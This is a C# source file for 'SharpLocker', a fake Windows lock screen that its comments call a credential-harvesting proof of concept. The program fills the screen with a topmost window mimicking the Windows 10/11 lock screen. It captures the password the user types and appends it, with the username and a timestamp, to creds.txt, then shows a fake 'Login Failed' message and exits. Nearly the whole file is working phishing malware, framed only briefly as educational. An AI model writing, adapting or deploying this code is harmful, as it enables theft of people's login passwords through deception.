using System;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;

namespace SharpLocker
{
    // SharpLocker - Fake Lock Screen for Credential Harvesting
    // Educational Proof-of-Concept
    public class LockForm : Form
    {
        private TextBox passwordBox;
        private Label statusLabel;
        private PictureBox userAvatar;
        private Label userName;

        public LockForm()
        {
            // Fullscreen setup
            this.FormBorderStyle = FormBorderStyle.None;
            this.WindowState = FormWindowState.Maximized;
            this.TopMost = true;
            this.BackColor = Color.Black;
            
            // Background (could try to load current wallpaper in a real tool)
            // For this PoC, we use a solid generic lock color or simple background
            this.BackgroundImageLayout = ImageLayout.Stretch;

            InitializeComponent();
        }

        private void InitializeComponent()
        {
            // Simple generic UI mimicking Windows 10/11
            this.userName = new Label();
            this.userName.Text = Environment.UserName;
            this.userName.Font = new Font("Segoe UI", 36, FontStyle.Regular);
            this.userName.ForeColor = Color.White;
            this.userName.AutoSize = true;
            this.userName.Location = new Point(Screen.PrimaryScreen.Bounds.Width / 2 - 100, Screen.PrimaryScreen.Bounds.Height / 2 - 50);

            this.passwordBox = new TextBox();
            this.passwordBox.Font = new Font("Segoe UI", 14);
            this.passwordBox.UseSystemPasswordChar = true;
            this.passwordBox.Width = 300;
            this.passwordBox.Location = new Point(Screen.PrimaryScreen.Bounds.Width / 2 - 150, Screen.PrimaryScreen.Bounds.Height / 2 + 20);
            this.passwordBox.KeyDown += PasswordBox_KeyDown;

            this.statusLabel = new Label();
            this.statusLabel.Text = "Locked";
            this.statusLabel.ForeColor = Color.White;
            this.statusLabel.AutoSize = true;
            this.statusLabel.Location = new Point(Screen.PrimaryScreen.Bounds.Width / 2 - 20, Screen.PrimaryScreen.Bounds.Height / 2 + 60);

            this.Controls.Add(this.userName);
            this.Controls.Add(this.passwordBox);
            this.Controls.Add(this.statusLabel);
        }

        private void PasswordBox_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                string pass = passwordBox.Text;
                if (!string.IsNullOrEmpty(pass))
                {
                    // "Validate" (Harvest) credentials
                    try 
                    {
                        File.AppendAllText("creds.txt", $"User: {Environment.UserName} | Pass: {pass} | Time: {DateTime.Now}\n");
                        MessageBox.Show("Login Failed. Please try again.", "Windows Security", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        // In a real Op, you might just exit here to simulate a successful unlock, 
                        // or validate against AD. For PoC, we exit after capturing one.
                        Application.Exit();
                    }
                    catch { }
                }
            }
        }
        
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new LockForm());
        }
    }
}
